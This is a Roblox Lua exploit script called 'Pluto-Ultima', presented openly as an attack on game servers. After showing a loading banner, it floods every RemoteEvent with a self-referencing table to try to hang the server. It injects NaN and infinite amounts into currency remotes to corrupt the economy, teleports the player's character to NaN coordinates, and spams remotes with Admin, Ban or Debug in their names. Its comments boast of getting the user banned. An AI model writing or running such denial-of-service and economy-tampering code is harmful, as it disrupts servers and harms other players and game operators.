-- [[ PLUTO-ULTIMA: THE FINAL OVERLOAD ]]
-- RISK: 100% (INSTANT 1042 PERMANENT BAN)
-- TARGET: SERVER STABILITY & ECONOMY INTEGRITY

print("Pluto-Ultima: Overloading system logic. Terminating account link...")

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local LP = game:GetService("Players").LocalPlayer

-- 1. THE PLUTO LOADING UI (Requested)
local sg = Instance.new("ScreenGui", LP:WaitForChild("PlayerGui"))
local f = Instance.new("Frame", sg)
f.Size = UDim2.new(1, 0, 0, 100)
f.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
f.BorderSizePixel = 4
f.BorderColor3 = Color3.fromRGB(0, 255, 255)

local t = Instance.new("TextLabel", f)
t.Size = UDim2.new(1, 0, 1, 0)
t.Text = "PLEASE WAIT WHILE PLUTO SCRIPT IS LOADING"
t.TextColor3 = Color3.fromRGB(255, 255, 255)
t.Font = Enum.Font.GothamBold
t.TextSize = 24

-- 2. THE "CIRCULAR PACKET CRASH" (ATTACKING THE SERVER)
-- This sends a self-referencing table. When the server tries to 
-- deserialize/read this data, it enters an infinite loop and hangs.
task.spawn(function()
    local CircularTable = {}
    CircularTable[1] = CircularTable -- THE KILLER: Infinite recursion
    
    while true do
        for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
            if remote:IsA("RemoteEvent") then
                pcall(function()
                    -- Sending 500 recursive loops per frame
                    for i = 1, 500 do
                        remote:FireServer(CircularTable)
                    end
                end)
            end
        end
        RunService.Heartbeat:Wait()
    end
end)

-- 3. THE "NaN" ECONOMY BOMB (INSTANT 1042 BAN)
-- Injecting "Not a Number" into currency remotes.
-- This forces the server's math handler to crash for your specific UserID.
task.spawn(function()
    local Remotes = {
        ReplicatedStorage:FindFirstChild("DonateMoney", true),
        ReplicatedStorage:FindFirstChild("JobAction", true),
        ReplicatedStorage:FindFirstChild("PurchaseItem", true)
    }
    
    while true do
        for _, r in pairs(Remotes) do
            if r then
                pcall(function()
                    -- Attempting to set balance/reward to NaN (0/0)
                    r:FireServer("Complete", {["Amount"] = 0/0, ["Value"] = math.huge})
                end)
            end
        end
        task.wait(0.01)
    end
end)

-- 4. SERVER-AUTHORITY POSITION BREACH
-- Moving your character to an illegal coordinate (Infinity/NaN).
-- This triggers the Roblox 'Server Authority' physics ban.
task.spawn(function()
    local Char = LP.Character or LP.CharacterAdded:Wait()
    local Root = Char:WaitForChild("HumanoidRootPart")
    
    RunService.Heartbeat:Connect(function()
        -- Teleporting to 'Not a Number' results in instant removal from the map.
        Root.CFrame = CFrame.new(0/0, 1/0, 0/0)
    end)
end)

-- 5. THE "HONEYPOT" MODERATION SWEEP
-- Actively hunts for remotes with "Admin", "Mod", or "Ban" in the name.
for _, v in pairs(ReplicatedStorage:GetDescendants()) do
    if v:IsA("RemoteEvent") and (v.Name:find("Admin") or v.Name:find("Ban") or v.Name:find("Debug")) then
        task.spawn(function()
            while true do
                v:FireServer("PLUTO_X_DETECTION_OVERLOAD", true)
                task.wait()
            end
        end)
    end
end

print("Pluto-Ultima: Protocol active. Goodbye.")
